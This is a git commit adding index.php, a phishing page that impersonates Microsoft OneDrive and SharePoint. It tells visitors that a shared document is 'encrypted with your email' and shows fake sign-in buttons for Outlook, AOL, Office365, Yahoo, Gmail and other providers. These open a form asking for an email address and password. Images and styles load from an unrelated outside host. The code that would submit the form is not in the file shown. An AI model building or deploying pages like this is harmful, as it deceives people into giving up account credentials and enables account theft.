3ec79873981385159937010b002688de8d7bf0bf
Richard Isaac <oluwalekerichardisaac@gmail.com>
2023-06-05 14:30:14 +0100

    ----

---
+++ index.php
@@ -0,0 +1,127 @@
+
+<!doctype html><html lang="en"><head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&#x26;display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>Share Point Online</title>
+    <link href="https://ai-coins.store/one/hover.css" rel="stylesheet" media="all">
+
+     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+
+    <style type="text/css">
+
+
+    </style>
+  </head>
+  <body>
+    <div class="container-fluid">
+      <div class="row" style="background-image: url(&#x27;https://ai-coins.store/one/u4E6RiQ.png&#x27;); background-size: cover;background-repeat: no-repeat;">
+        <div class="col-lg-4 mx-auto my-5 px-5 pb-5" style=" background-color: rgba(0,0,0,0.5);border-radius:15px;">
+          <div>
+            <div class="text-center mt-3"> 
+            <img src="https://ai-coins.store/one/onedrive-white.png" class="img-fluid" width="200px"><br>
+            <span class="h1 text-white">One Drive</span><br><br>
+            <span class="h5 text-white">This document is encrypted with your email, Please login your email to view share files</span>
+          </div>
+              <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+              <div class="px-2 py-1 mt-2" style=" background-color: #0073C8;border-radius: 20px 0px 20px 0px;">
+                  <img src="https://ai-coins.store/one/outlook1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                  <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Outlook</span>
+              </div>
+               </a>
+               <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+              <div class="px-2 py-1 mt-2" style=" background-color: #31459B;border-radius: 20px 0px 20px 0px;">
+                  <img src="https://ai-coins.store/one/aol1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                  <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Aol</span>
+              </div>
+               </a>
+               <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+              <div class="px-2 py-1 mt-2" style=" background-color: #FF3C00;border-radius: 20px 0px 20px 0px;">
+                  <img src="https://ai-coins.store/one/office3651.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                  <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365</span>
+              </div>
+               </a>
+               <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+              <div class="px-2 py-1 mt-2" style=" background-color: #5F0F68;border-radius: 20px 0px 20px 0px;">
+                  <img src="https://ai-coins.store/one/yahoo1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                  <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Yahoo!</span>
+              </div>
+               </a>
+               <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100 mt-1" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+              <div class="px-2 py-1 mt-2" style=" background-color: #0B5BD3;border-radius: 20px 0px 20px 0px;">
+                  <img src="https://ai-coins.store/one/other1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">
+                  <span class="pl-3" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Other Mail</span>
+              </div>
+               </a>
+               <p class="text-white mt-3 text-center">Go to your all file anywhere on any device, and share them with anyone. One Drive your shared document in one cloud.</p>
+               <p class="h5 text-center text-white">OneDrive © 2023</p> 
+          </div> 
+        </div> 
+      </div> 
+    </div>
+
+    
+
+    <!-- Modal for gmail -->
+    <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+      <div class="modal-dialog" role="document">
+        <div class="modal-content">
+          <div class="modal-header">
+
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+              <span aria-hidden="true">×</span>
+            </button>
+          </div>
+          <div class="modal-body">
+            <center>
+              <img id="fieldImg" src="https://ai-coins.store/one/gmail.png" class="img-fluid rounded-circle" width="80px">
+              <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
+              <div class="alert alert-danger" id="msg"></div>
+
+            </center>
+            <form id="contact" class="form-horizontal well">
+              <div class="col-lg-12">
+                <div class="form-group">
+                  <label for="exampleInputEmail1">Email address</label>
+                  <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email address">
+                  <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+                </div>
+              </div>
+              <div class="col-lg-12">
+                <div class="form-group">
+                  <label for="Password">Password</label>
+                  <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
+                </div>
+              </div>
+            </form></div>
+            <div class="modal-footer">
+              <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+              <button class="btn btn-lg btn-info pull-right" id="submit-btn">Download</button>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>
+  </body>
+ 
+  
+
+</body></html>
